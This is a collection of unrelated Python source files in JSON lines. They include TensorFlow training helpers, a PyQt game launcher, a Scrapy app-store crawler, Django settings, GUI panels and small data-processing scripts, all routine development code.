{"text": "import tensorflow as tf\n\n\ndef compute_loss(logits, labels):\n    labels = tf.squeeze(tf.cast(labels, tf.int32))\n\n    cross_entropy = tf.nn.sparse_softmax_cross_entropy_with_logits(logits=logits, labels=labels)\n    cross_entropy_loss= tf.reduce_mean(cross_entropy)\n    reg_loss = tf.reduce_mean(tf.get_collection(tf.GraphKeys.REGULARIZATION_LOSSES))\n\n    return cross_entropy_loss + reg_loss, cross_entropy_loss, reg_loss\n\n\ndef compute_accuracy(logits, labels):\n    labels = tf.squeeze(tf.cast(labels, tf.int32))\n    batch_predictions = tf.cast(tf.argmax(logits, 1), tf.int32)\n    predicted_correctly = tf.equal(batch_predictions, labels)\n    accuracy = tf.reduce_mean(tf.cast(predicted_correctly, tf.float32))\n    return accuracy\n\n\ndef get_learning_rate(global_step, initial_value, decay_steps, decay_rate):\n    learning_rate = tf.train.exponential_decay(initial_value, global_step, decay_steps, decay_rate, staircase=True)\n    return learning_rate\n\n\ndef train(total_loss, learning_rate, global_step):\n    optimizer = tf.train.AdamOptimizer(learning_rate)\n    train_op = optimizer.minimize(total_loss, global_step)\n    return train_op\n\n\ndef average_gradients(gradients):\n    average_grads = []\n    for grad_and_vars in zip(*gradients):\n        grads = []\n        for g, _ in grad_and_vars:\n            grads.append(tf.expand_dims(g, 0))\n\n        grad = tf.concat(grads, 0)\n        grad = tf.reduce_mean(grad, 0)\n\n        v = grad_and_vars[0][1]\n        grad_and_var = (grad, v)\n        average_grads.append(grad_and_var)\n    return average_grads\n"}
{"text": "import os\nimport sys\n\nfrom PyQt5 import QtCore, QtWidgets\nimport config\nimport re\n\nimport util\nimport logging\nlogger = logging.getLogger(__name__)\n\nfrom model.game import GameState\n\n__author__ = 'Thygrrr'\n\n\nclass GameArguments:\n    pass\n\n\nclass GameProcess(QtCore.QProcess):\n    def __init__(self, *args, **kwargs):\n        QtCore.QProcess.__init__(self, *args, **kwargs)\n        self._info = None\n        self._game = None\n        self.gameset = None\n\n    # Game which we track to update game info\n    @property\n    def game(self):\n        return self._game\n\n    @game.setter\n    def game(self, value):\n        if self._game is not None:\n            self._game.updated.disconnect(self._trackGameUpdate)\n        self._game = value\n\n        if self._game is not None:\n            self._game.updated.connect(self._trackGameUpdate)\n            self._trackGameUpdate()\n\n    # Check new games from the server to find one matching our uid\n    def newServerGame(self, game):\n        if not self._info or self._info['complete']:\n            return\n        if self._info['uid'] != game.uid:\n            return\n        self.game = game\n\n    def _clearGame(self, _=None):\n        self.game = None\n\n    def _trackGameUpdate(self, _=None):\n        if self.game.state == GameState.CLOSED:\n            self.game = None\n            return\n        if self.game.state != GameState.PLAYING:\n            return\n\n        self._info.update(self.game.to_dict())\n        self._info['complete'] = True\n        self.game = None\n        logger.info(\"Game Info Complete: \" + str(self._info))\n\n    def run(self, info, arguments, detach=False, init_file=None):\n            \"\"\"\n            Performs the actual running of ForgedAlliance.exe\n            in an attached process.\n            \"\"\"\n\n            if self._info is not None:  # Stop tracking current game\n                self.game = None\n\n            self._info = info    # This can be none if we're running a replay\n            if self._info is not None:\n                self._info.setdefault('complete', False)\n                if not self._info['complete']:\n                    uid = self._info['uid']\n                    try:\n                        self.game = self.gameset[uid]\n                    except KeyError:\n                        pass\n\n            executable = os.path.join(config.Settings.get('game/bin/path'),\n                                      \"ForgedAlliance.exe\")\n            if sys.platform == 'win32':\n                command = '\"' + executable + '\" ' + \" \".join(arguments)\n            else:\n                command = util.wine_cmd_prefix + \" \" + util.wine_exe + ' \"' + executable + '\" ' + \" \".join(arguments)\n                if util.wine_prefix:\n                    wine_env = QtCore.QProcessEnvironment.systemEnvironment()\n                    wine_env.insert(\"WINEPREFIX\", util.wine_prefix)\n                    QtCore.QProcess.setProcessEnvironment(self, wine_env)\n            logger.info(\"Running FA with info: \" + str(info))\n            logger.info(\"Running FA via command: \" + command)\n            logger.info(\"Running FA via executable: \" + executable)\n\n            # Launch the game as a stand alone process\n            if not instance.running():\n\n                self.setWorkingDirectory(os.path.dirname(executable))\n                if not detach:\n                    self.start(command)\n                else:\n                    # Remove the wrapping \" at the start and end of some arguments as QT will double wrap when launching\n                    arguments = [re.sub('(^\"|\"$)', '', element) for element in arguments]\n                    self.startDetached(executable, arguments, os.path.dirname(executable))\n                return True\n            else:\n                QtWidgets.QMessageBox.warning(None, \"ForgedAlliance.exe\", \"Another instance of FA is already running.\")\n                return False\n\n    def running(self):\n        return self.state() == QtCore.QProcess.Running\n\n    def available(self):\n        if self.running():\n            QtWidgets.QMessageBox.warning(QtWidgets.QApplication.activeWindow(), \"ForgedAllianceForever.exe\",\n                                          \"<b>Forged Alliance is already running.</b><br/>You can only run one \"\n                                          \"instance of the game.\")\n            return False\n        return True\n\n    def close(self):\n        if self.running():\n            progress = QtWidgets.QProgressDialog()\n            progress.setCancelButtonText(\"Terminate\")\n            progress.setWindowFlags(QtCore.Qt.CustomizeWindowHint | QtCore.Qt.WindowTitleHint)\n            progress.setAutoClose(False)\n            progress.setAutoReset(False)\n            progress.setMinimum(0)\n            progress.setMaximum(0)\n            progress.setValue(0)\n            progress.setModal(1)\n            progress.setWindowTitle(\"Waiting for Game to Close\")\n            progress.setLabelText(\"FA Forever exited, but ForgedAlliance.exe is still running.<p align='left'><ul><b>\"\n                                  \"Are you still in a game?</b><br/><br/>You may choose to:<li>press <b>ALT+TAB</b> \"\n                                  \"to return to the game</li><li>kill ForgedAlliance.exe by clicking <b>Terminate</b>\"\n                                  \"</li></ul></p>\")\n            progress.show()\n\n            while self.running() and progress.isVisible():\n                QtWidgets.QApplication.processEvents()\n\n            progress.close()\n\n            if self.running():\n                self.kill()\n\n            self.close()\n\n\ninstance = GameProcess()\n"}
{"text": "import uuid\n\n\nclass Task(object):\n\n    STATUS_QUEUED = 'queued'\n    STATUS_EXECUTING = 'executing'\n    STATUS_FAILED = 'failed'\n    STATUS_SKIPPED = 'skipped'\n    STATUS_COMPLETED = 'completed'\n\n    def __init__(self, job):\n        self.status = self.STATUS_QUEUED\n        self.id = uuid.uuid4().hex\n        self.type = None\n        self.start_ts = None\n        self.finish_ts = None\n        self.attempts = 0\n        self.error_msg = []\n        self.parent_job = job\n\n    def on_exec_start(self, processor):\n        \"\"\"\n        Called every time task changes status from 'queued' to 'executing'\n        \"\"\"\n        pass\n\n    def on_exec_stop(self, processor):\n        \"\"\"\n        Called every time task changes status from 'executing' to anything else\n        \"\"\"\n        pass\n\n    @classmethod\n    def new(cls, job, **kwargs):\n        task = cls(job)\n        for param in cls.PARAMS:\n            setattr(task, param, kwargs.get(param))\n        return task\n\n    @classmethod\n    def from_data(cls, data, job):\n        task = cls(job)\n        task.load(data)\n        return task\n\n    def load(self, data):\n        # TODO: remove 'or' part\n        self.id = data['id'] or uuid.uuid4().hex\n        self.status = data['status']\n        self.type = data['type']\n        self.start_ts = data['start_ts']\n        self.finish_ts = data['finish_ts']\n        self.error_msg = data['error_msg']\n        self.attempts = data.get('attempts', 0)\n\n        for param in self.PARAMS:\n            val = data.get(param)\n            if isinstance(val, unicode):\n                val = val.encode('utf-8')\n            setattr(self, param, val)\n\n    def dump(self):\n        res = {'status': self.status,\n               'id': self.id,\n               'type': self.type,\n               'start_ts': self.start_ts,\n               'finish_ts': self.finish_ts,\n               'error_msg': self.error_msg,\n               'attempts': self.attempts}\n        res.update({\n            k: getattr(self, k)\n            for k in self.PARAMS\n        })\n        return res\n\n    def human_dump(self):\n        return self.dump()\n\n    def __str__(self):\n        raise RuntimeError('__str__ method should be implemented in '\n            'derived class')\n"}
{"text": "# from model_mommy import mommy\n# from django.test import TestCase\n#\n# from ..section import Section\n# from django.contrib.auth.models import User\n#\n#\n# class TestSectionPolygon(TestCase):\n#\n#     def setUp(self):\n#         self.user = User.objects.create_user(\n#             username='tuser', email='tuser@bhp.org.bw', password='top_secret@321')\n#\n#     def test_section_polygon(self):\n#         \"\"\"Test that a section instance gets created.\n#         \"\"\"\n#         mommy.make_recipe(\n#             'edc_map.section',\n#             location_identifier='123123123',\n#             user=self.user\n#         )\n#         self.assertEqual(Section.objects.all().count(), 1)\n#\n#     def test_section_polygon2(self):\n#         \"\"\"Assert that polygon properties return lists.\"\"\"\n#         section = mommy.make_recipe(\n#             'edc_map.section',\n#             location_identifier='123123123',\n#             user=self.user\n#         )\n#         section = Section.objects.get(id=section.id)\n#         self.assertTrue(type(section.section_polygon_list) is list)\n#         self.assertTrue(type(section.sub_section_polygon_list) is list)\n"}
{"text": "from __future__ import print_function, unicode_literals, absolute_import\n\nfrom agstools._helpers import create_argument_groups, execute_args, format_output_path\nfrom ._helpers import open_map_document\n\ndef create_parser_save_copy(parser):\n    parser_copy = parser.add_parser(\"copy\", add_help = False,\n        help = \"Saves a copy of an ArcGIS map document, optionally in a different output version.\")\n    parser_copy.set_defaults(func = execute_args, lib_func = save_a_copy)\n\n    group_req, group_opt, group_flags = create_argument_groups(parser_copy)\n\n    group_req.add_argument(\"-m\", \"--mxd\", required = True,\n        help = \"File path to the map document (*.mxd) to copy.\")\n\n    group_req.add_argument(\"-o\", \"--output\", required = True,\n        help = \"The path on which to save the copy of the map document.\")\n\n    group_opt.add_argument(\"-v\", \"--version\", type=str, choices=[\"8.3\", \"9.0\", \"9.2\", \"9.3\", \"10.0\", \"10.1\", \"10.3\"],\n        help = \"The output version number for the saved copy.\")\n\ndef save_a_copy(mxd, output_path, version = None):\n    import arcpy\n\n    output_path = format_output_path(output_path)\n\n    print(\"Opening map document: {0}\".format(mxd))\n    map = open_map_document(mxd)\n\n    print(\"Saving a copy to: {0}\".format(output_path))\n    if version == None:\n        map.saveACopy(output_path)\n    else:\n        map.saveACopy(output_path, version)\n\n    print(\"Done.\")"}
{"text": "#  Copyright (c) 2001 Autonomous Zone Industries\n#  This file is licensed under the\n#    GNU Lesser General Public License v2.1.\n#    See the file COPYING or visit http://www.gnu.org/ for details.\n\n__revision__ = \"$Id: CommHints.py,v 1.2 2002/12/02 19:58:44 myers_carpenter Exp $\"\n\n### standard modules\nimport types\n\n# The following hints can be passed to `send_msg()' to allow the comms handler to optimize\n# usage of the underlying communication system.  A correct comms handler implementation\n# could, of course, ignore these hints, and the comms handler should not fail to send a\n# message, send it to the wrong counterparty, or otherwise do something incorrect no matter\n# what hints are passed.\n\n# This hint means that you expect an immediate response.  For example, the TCPCommsHandler\n# holds the connection open after sending until it gets a message on that connection, then\n# closes it.  (Unless HINT_EXPECT_MORE_TRANSACTIONS is also passed, in which case see\n# below.)\nHINT_EXPECT_RESPONSE = 1\n\n# This hint means that you expect to send and receive messages with this counterparty in the\n# near future.  (Who knows what that means?  This is just a hint.)   For example, the\n# TCPCommsHandler holds the connection open after sending unless it has too many open\n# connections, in which case it closes it.\nHINT_EXPECT_MORE_TRANSACTIONS = 2\n\n# For example, if both HINT_EXPECT_RESPONSE and HINT_EXPECT_MORE_TRANSACTIONS are passed,\n# then the TCPCommsHandler holds the connection open until it receives a message on that\n# connection, then reverts to HINT_EXPECT_MORE_TRANSACTIONS -style mode in which it keeps\n# the connection open unless it has too many open connections.\n\n# This hint means that you expect no more messages to or from this counterparty.  For\n# example, the TCPCommsHandler closes the connection immediately after sending the message.\n# If you pass both HINT_EXPECT_NO_MORE_COMMS and one of the previous hints then you are\n# silly.\nHINT_EXPECT_NO_MORE_COMMS = 4\n\n# This hint means that you are going to send something.  For example, the TCPCommsHandler\n# holds open a connection after it receives a query and then closed it after sending the reply.\nHINT_EXPECT_TO_RESPOND = 8\n\n# This hint, when passed with a call to `send()' indicates that the message is a response to an\n# earlier received query.\nHINT_THIS_IS_A_RESPONSE = 16\n\nHINT_NO_HINT = 0\n\ndef is_hint(thingie, IntType=types.IntType, LongType=types.LongType):\n    if not type(thingie) in (IntType, LongType,):\n        return 0 # `false'\n    return (thingie >= 0) and (thingie < 32)\n\n"}
{"text": "import scrapy\nfrom scrapy.spiders import Spider\nfrom scrapy import Request\nimport re\nfrom scrapy.selector import Selector\nfrom xiaomi_appstore_crawler.items import XiaomiAppstoreCrawlerItem\n\nclass XiaomiSpider(Spider):\n    name = \"xiaomi\"\n    allowed_domains = [\"app.mi.com\"]\n\n    start_urls = [\n        \"http://app.mi.com/topList?page=1\"\n    ]\n\n    def parse(self, response):\n        #import pudb; pu.db\n        page = Selector(response)\n\n        page_nexts = page.xpath('//div[@class=\"pages\"]/a')\n        page_max = int(page_nexts[-2].xpath('text()').extract_first())\n\n        for page_id in xrange(1, 2): #xrange(1, page_max + 1):\n            url = '{0}{1}'.format('http://app.mi.com/topList?page=', str(page_id)) \n            yield scrapy.Request(url, callback=self.parse_page)\n\n\n    def parse_page(self, response):\n        page = Selector(response)\n        lis = page.xpath('//ul[@class=\"applist\"]/li')\n        if lis == None:\n            return\n\n        url_common = 'http://app.mi.com'\n\n        for li in lis:\n            item = XiaomiAppstoreCrawlerItem()\n            item['title'] = li.xpath('./h5/a/text()').extract_first().encode('utf-8')\n            url = li.xpath('./h5/a/@href').extract_first()\n            appid = re.match(r'/detail/(.*)', url).group(1)\n            item['appid'] = appid\n            # import pudb; pu.db\n            req = scrapy.Request(url_common + url, callback=self.parse_details)\n            req.meta[\"item\"] = item\n            yield req\n\n    def parse_details(self, response):\n            item = response.meta[\"item\"]\n            page = Selector(response)\n            lis = page.xpath('//div[@class=\"second-imgbox\"]/ul/li')\n            \n            recommended = []\n            for li in lis:\n                url = li.xpath('./a/@href').extract_first()\n                appid = re.match(r'/detail/(.*)', url).group(1)\n                recommended.append(appid)\n\n            item['recommended'] = recommended\n            #import pudb; pu.db\n            yield item\n\n"}
{"text": "#\n# Copyright (C) 2012 Tobias Bolten\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\n#\n\nimport wx\n\nfrom gamera.gui import compat_wx\nfrom gamera.gui.gaoptimizer.ExpertSettingPanel import *\n\n#-------------------------------------------------------------------------------\nclass StopCriteriaPanel(ExpertSettingPanel):\n#-------------------------------------------------------------------------------\n    #---------------------------------------------------------------------------\n    def __init__(self, parent, id):\n    #---------------------------------------------------------------------------\n        ExpertSettingPanel.__init__(self, parent, id)\n\n        sizer = wx.GridBagSizer(hgap=5, vgap=5)\n        self.SetSizer(sizer)\n\n        # best fitness\n        self.bestFitness = wx.CheckBox(self, -1, \"Perfect LOO-recognition reached\", \\\n            name = \"bestFitnessStop\")\n        sizer.Add(self.bestFitness, pos=(0,0), \\\n            flag = wx.LEFT | wx.RIGHT | wx.TOP | wx.EXPAND, border=10)\n\n        self.genericWidgets.append(self.bestFitness)\n\n        # generation counter\n        self.maxGeneration = wx.CheckBox(self, -1, \"Max. number of generations\", \\\n            name = \"maxGenerations\")\n        sizer.Add(self.maxGeneration, pos=(1,0), \\\n            flag = wx.LEFT | wx.RIGHT | wx.EXPAND, border = 10)\n        self.maxGenerationCount = wx.SpinCtrl(self, -1, size=(100,-1), \\\n            min=10, max=5000, value='100')\n        compat_wx.set_tool_tip(self.maxGenerationCount, \"Number of generations\")\n        self.maxGenerationCount.Disable()\n        sizer.Add(self.maxGenerationCount, pos=(1,1), \\\n            flag = wx.LEFT | wx.RIGHT | wx.EXPAND, border=10)\n\n        self.genericWidgets.append(self.maxGeneration)\n        self.AddChildToParent(self.maxGeneration, self.maxGenerationCount)\n\n        # fitness counter\n        self.maxFitnessEval = wx.CheckBox(self, -1, \"Max. number of fitness evals\", \\\n            name = \"maxFitnessEvals\")\n        sizer.Add(self.maxFitnessEval, pos=(2,0), \\\n            flag = wx.LEFT | wx.RIGHT | wx.EXPAND, border=10)\n        self.maxFitnessEvalCount = wx.SpinCtrl(self, -1, size=(100,-1), \\\n            min=10, max=50000, value='5000')\n        compat_wx.set_tool_tip(self.maxFitnessEvalCount, \"Number of evaluations\")\n        self.maxFitnessEvalCount.Disable()\n        sizer.Add(self.maxFitnessEvalCount, pos=(2,1), \\\n            flag = wx.LEFT | wx.RIGHT | wx.EXPAND, border=10)\n\n        self.genericWidgets.append(self.maxFitnessEval)\n        self.AddChildToParent(self.maxFitnessEval, self.maxFitnessEvalCount)\n\n        # steady state continue\n        self.steadyContinue = wx.CheckBox(self, -1, \"Steady state continue\", \\\n            name = \"steadyStateStop\")\n        self.steadyContinue.SetValue(True)\n        sizer.Add(self.steadyContinue, pos=(3,0), \\\n            flag = wx.LEFT | wx.RIGHT | wx.BOTTOM | wx.EXPAND, border=10)\n        self.steadyContinueMin = wx.SpinCtrl(self, -1, size=(100,-1), \\\n            min=10, max=250000, value='40')\n        compat_wx.set_tool_tip(self.steadyContinueMin, \"Minimum generations\")\n        sizer.Add(self.steadyContinueMin, pos=(3,1), \\\n            flag = wx.LEFT | wx.RIGHT | wx.BOTTOM | wx.EXPAND, border=10)\n        self.steadyContinueNoChange = wx.SpinCtrl(self, -1, size=(100,-1), \\\n            min=1, max=10000, value='10')\n        compat_wx.set_tool_tip(self.steadyContinueNoChange, \"Generations without improvement\")\n        sizer.Add(self.steadyContinueNoChange, pos=(3,2), \\\n            flag = wx.LEFT | wx.RIGHT | wx.BOTTOM | wx.EXPAND, border=10)\n\n        self.genericWidgets.append(self.steadyContinue)\n        self.AddChildToParent(self.steadyContinue, self.steadyContinueMin)\n        self.AddChildToParent(self.steadyContinue, self.steadyContinueNoChange)\n\n        # bind the EVT_CHECKBOX to the CheckBoxes\n        self.BindEvent(wx.EVT_CHECKBOX, self.OnCheckBox, \\\n            [self.bestFitness, self.maxGeneration,\n             self.maxFitnessEval, \n             self.steadyContinue])\n"}
{"text": "# Copyright 2020 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n# Lint as: python3\n\"\"\"Tests for training GNN models.\"\"\"\nimport numpy as np\nimport sonnet.v2 as snt\nimport tensorflow.compat.v2 as tf\nfrom absl.testing import absltest, parameterized\nfrom graph_attribution import experiments, featurization\nfrom graph_attribution import graphnet_models as gnn_models\nfrom graph_attribution import graphs as graph_utils\nfrom graph_attribution import templates, training\n\n\nclass TrainingTests(parameterized.TestCase):\n  \"\"\"Basic tests for training a model.\"\"\"\n\n  def _setup_graphs_labels(self, n_graphs):\n    \"\"\"Setup graphs and labels for a binary classification learning task.\"\"\"\n    tensorizer = featurization.MolTensorizer()\n    smiles_pool = ['CO', 'CCC', 'CN1C=NC2=C1C(=O)N(C(=O)N2C)C', 'CCCO']\n    smiles = np.random.choice(smiles_pool, n_graphs)\n    graphs = graph_utils.smiles_to_graphs_tuple(smiles, tensorizer)\n    n_labels = len(graphs.nodes) if n_graphs == 1 else n_graphs\n    labels = np.random.choice([0, 1], n_labels).reshape(-1, 1)\n    return graphs, labels\n\n  def _setup_model(self, n_graphs):\n    target_type = templates.TargetType.globals if n_graphs > 1 else templates.TargetType.nodes\n    model = experiments.GNN(10, 10, 10, 1, gnn_models.BlockType('gcn'), 'relu',\n                            target_type, 3)\n    return model\n\n  @parameterized.named_parameters(('constant', 1024, 256, 4),\n                                  ('droplast', 1000, 256, 3))\n  def test_get_batch_indices(self, n, batch_size, expected_n_batches):\n    batch_indices = training.get_batch_indices(n, batch_size)\n    self.assertEqual(batch_indices.shape, (expected_n_batches, batch_size))\n\n  @parameterized.parameters([0.2, 1.0])\n  def test_augment_binary_task(self, fraction):\n    \"\"\"Check that data augmention sizes are correct.\"\"\"\n    initial_n = 10\n    x, y = self._setup_graphs_labels(initial_n)\n    node_vec = np.zeros_like(x.nodes[0])\n    edge_vec = np.zeros_like(x.edges[0])\n    initial_positive = int(np.sum(y == 1))\n    aug_n = int(np.floor(fraction * initial_positive))\n    expected_n = initial_n + aug_n * 2\n    x_aug, y_aug = training.augment_binary_task(x, y, node_vec, edge_vec,\n                                                fraction)\n    self.assertEqual(graph_utils.get_num_graphs(x_aug), expected_n)\n    self.assertLen(y_aug, expected_n)\n    # Make sure half of the augmented examples are positive labels.\n    aug_positive = np.sum(y_aug == 1) - initial_positive\n    self.assertEqual(aug_positive, aug_n)\n\n  @parameterized.named_parameters(('onegraph', 1),\n                                  ('minibatch', 25))\n  def test_make_tf_opt_epoch_fn(self, batch_size):\n    \"\"\"Make sure tf-optimized epoch gives a valid loss.\"\"\"\n    x, y = self._setup_graphs_labels(batch_size)\n    model = self._setup_model(batch_size)\n    opt = snt.optimizers.Adam()\n    loss_fn = tf.keras.losses.BinaryCrossentropy()\n    opt_fn = training.make_tf_opt_epoch_fn(x, y, batch_size, model, opt,\n                                           loss_fn)\n    loss = opt_fn(x, y).numpy()\n    self.assertTrue(np.isfinite(loss))\n\n\nif __name__ == '__main__':\n  tf.config.experimental_run_functions_eagerly(True)\n  absltest.main()\n"}
{"text": "#!/usr/bin/env python\nimport click\nimport os\nimport codecs\nimport json\nimport pandas as pd\n\nfrom nlppln.utils import create_dirs, get_files\n\n\n@click.command()\n@click.argument('in_dir', type=click.Path(exists=True))\n@click.option('--out_dir', '-o', default=os.getcwd(), type=click.Path())\n@click.option('--name', '-n', default='ner_stats.csv')\ndef nerstats(in_dir, out_dir, name):\n    create_dirs(out_dir)\n\n    frames = []\n\n    in_files = get_files(in_dir)\n\n    for fi in in_files:\n        with codecs.open(fi, encoding='utf-8') as f:\n            saf = json.load(f)\n        data = {}\n        data['word'] = [t['word'] for t in saf['tokens'] if 'ne' in t.keys()]\n        data['ner'] = [t['ne'] for t in saf['tokens'] if 'ne' in t.keys()]\n        data['w_id'] = [t['id'] for t in saf['tokens'] if 'ne' in t.keys()]\n        data['text'] = [os.path.basename(fi)\n                        for t in saf['tokens'] if 'ne' in t.keys()]\n\n        frames.append(pd.DataFrame(data=data))\n\n    df = pd.concat(frames, ignore_index=True)\n    df.to_csv(os.path.join(out_dir, name), encoding='utf-8')\n\n\nif __name__ == '__main__':\n    nerstats()\n"}
{"text": "\"\"\"\nDjango settings for xavchik project.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/1.7/topics/settings/\n\nFor the full list of settings and their values, see\nhttps://docs.djangoproject.com/en/1.7/ref/settings/\n\"\"\"\n\n# Build paths inside the project like this: os.path.join(BASE_DIR, ...)\nimport os\nBASE_DIR = os.path.dirname(os.path.dirname(__file__))\n\n\n# Quick-start development settings - unsuitable for production\n# See https://docs.djangoproject.com/en/1.7/howto/deployment/checklist/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '(#@6cjvgq1^pp0*o*^8hs20ozo!27do1&-^nqc92ol%4d8)(5l'\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = True\n\nTEMPLATE_DEBUG = True\n\nALLOWED_HOSTS = []\n\n\n# Application definition\n\nINSTALLED_APPS = (\n    'xavchik',\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n)\n\nMIDDLEWARE_CLASSES = (\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.auth.middleware.SessionAuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n)\n\nROOT_URLCONF = 'xavchik.urls'\n\nWSGI_APPLICATION = 'xavchik.wsgi.application'\n\n\n# Database\n# https://docs.djangoproject.com/en/1.7/ref/settings/#databases\n\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': os.path.join(BASE_DIR, 'db.sqlite3'),\n    }\n}\n\n# Internationalization\n# https://docs.djangoproject.com/en/1.7/topics/i18n/\n\nLANGUAGE_CODE = 'en-us'\n\nTIME_ZONE = 'UTC'\n\nUSE_I18N = True\n\nUSE_L10N = True\n\nUSE_TZ = True\n\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/1.7/howto/static-files/\n\nSTATIC_URL = '/static/'\n\nSTATICFILES_DIRS = (\n    ('static', '/Volumes/Macintosh HD 2 2/work_projects/python/ordering_lunch/xavchik/static'),\n)\nTEMPLATE_DIRS = (\n    os.path.join(BASE_DIR,  'templates'),\n)"}
{"text": "import sys\r\n\r\n# Check and fail early!\r\nif (len(sys.argv) != 2):\r\n\tprint('\\nERROR: Must supply the image you want to run prediction on!\\n')\r\n\texit(-1)\r\n\r\nimport tensorflow as tf\r\n\r\nimage_path = sys.argv[1]\r\n\r\n# Read in the image_data\r\nimage_data = tf.gfile.FastGFile(image_path, 'rb').read()\r\n\r\n# Loads label file, strips off carriage return\r\nlabel_lines = [line.rstrip() for line \r\n                   in tf.gfile.GFile(\"retrained_labels.txt\")]\r\n\r\n# Unpersists graph from file\r\nwith tf.gfile.FastGFile(\"retrained_graph.pb\", 'rb') as f:\r\n    graph_def = tf.GraphDef()\r\n    graph_def.ParseFromString(f.read())\r\n    _ = tf.import_graph_def(graph_def, name='')\r\n\r\nwith tf.Session() as sess:\r\n    # Feed the image_data as input to the graph and get first prediction\r\n    softmax_tensor = sess.graph.get_tensor_by_name('final_result:0')\r\n    \r\n    predictions = sess.run(softmax_tensor, \\\r\n             {'DecodeJpeg/contents:0': image_data})\r\n    \r\n    # Sort to show labels of first prediction in order of confidence\r\n    top_k = predictions[0].argsort()[-len(predictions[0]):][::-1]\r\n    \r\n    for node_id in top_k:\r\n        human_string = label_lines[node_id]\r\n        score = predictions[0][node_id]\r\n        print('%s (score = %.5f)' % (human_string, score))\r\n\t\t"}
{"text": "# import drawing lib\r\nimport pygame\r\n# pygame constants as events' constants\r\nfrom pygame.locals import *\r\n# game constants\r\nfrom constants import *\r\nfrom buttonwimage import ButtonWImage\r\nimport glob\r\nimport os\r\nimport textentry\r\nfrom button import Button\r\nimport shutil\r\n\r\n\r\nclass Personnalize:\r\n    def __init__(self, win):\r\n        self.running = False\r\n        self.win = win\r\n\r\n        self.dbox = textentry.TextBox(self.win, font=pygame.font.SysFont(\"arial\", 18), sy=22, x=((WIDTH - 120) // 2), y=HEIGHT - 32)\r\n        self.btns = []\r\n        x, y = 200, 20\r\n        i = 0\r\n        for folder in sorted(glob.glob(\"gfx/personnalize/*\")):\r\n            self.btns.append(ButtonWImage(x, y, 64, 64, folder + \"/front.png\", (128, 48, 120)))\r\n            i += 1\r\n            if i == 5:\r\n                y = 20\r\n                x = WIDTH - 264\r\n            else:\r\n                y += 74\r\n        self.valid_btn = Button((WIDTH - 80) // 2, (HEIGHT - 32), 50, 22, \"Valider\", (12, 200, 35), pygame.font.SysFont(\"arial\", 18), (0, 0, 0))\r\n        self.has_valid = False\r\n        self.selected = -1\r\n\r\n    def load(self):\r\n        self.running = True\r\n\r\n    def update(self):\r\n        pass\r\n\r\n    def render(self):\r\n        pygame.draw.rect(self.win, (20, 175, 170), (0, 0) + self.win.get_size())\r\n        for btn in self.btns:\r\n            btn.render(self.win)\r\n        if not self.has_valid:\r\n            self.valid_btn.render(self.win)\r\n        else:\r\n            self.dbox.mainloop()\r\n\r\n    def create_game(self):\r\n        with open(\"saves/game\", \"w\") as file:\r\n            file.write(self.dbox.input)\r\n        folder = sorted(glob.glob(\"gfx/personnalize/*\"))[self.selected]\r\n        for f in glob.glob(folder + \"/*.png\"):\r\n            if os.path.exists(\"gfx/player/\" + os.path.basename(f)):\r\n                os.remove(\"gfx/player/\" + os.path.basename(f))\r\n            shutil.copyfile(f, \"gfx/player/\" + os.path.basename(f))\r\n\r\n    def run(self):\r\n        while self.running:\r\n            for ev in pygame.event.get():\r\n                if ev.type == QUIT:\r\n                    self.running = False\r\n                elif ev.type == MOUSEBUTTONDOWN:\r\n                    x, y = pygame.mouse.get_pos()\r\n                    for i, btn in enumerate(self.btns):\r\n                        if btn.collide(x, y):\r\n                            if self.selected != -1:\r\n                                self.btns[self.selected].color = (128, 48, 120)\r\n                            self.selected = i\r\n                            btn.color = (50, 120, 50)\r\n                            break\r\n                    if not self.has_valid:\r\n                        if self.valid_btn.collide(x, y):\r\n                            self.has_valid = True\r\n\r\n            if not self.dbox.is_running():\r\n                self.create_game()\r\n                self.running = False\r\n\r\n            self.update()\r\n\r\n            self.render()\r\n\r\n            pygame.display.flip()\r\n"}
